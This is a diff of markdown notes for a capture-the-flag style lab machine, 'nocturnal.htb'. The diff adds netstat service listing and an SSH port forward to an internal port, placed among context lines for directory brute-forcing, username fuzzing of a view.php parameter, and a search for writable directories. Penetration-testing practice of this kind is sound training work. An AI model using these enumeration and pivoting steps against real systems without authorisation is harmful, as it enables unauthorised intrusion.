@@ -118,6 +118,15 @@ feroxbuster -u http://nocturnal.htb/ -w /usr/share/wordlists/dirbuster/directory
 ffuf -w /home/naahl/Desktop/xato-net-10-million-usernames-dup.txt -u 'http://nocturnal.htb/view.php?username=FUZZ&file=bad.odt' -fw 1167
 ```
 
+list of internal service running
+```shell
+netstat -tulpn
+```
+
+port forwarding
+```shell
+ssh -L 8888:127.0.0.1:8080 tobias@nocturnal.htb
+```
 ```shell
 find / -writable -type d 2>/dev/null
 ```
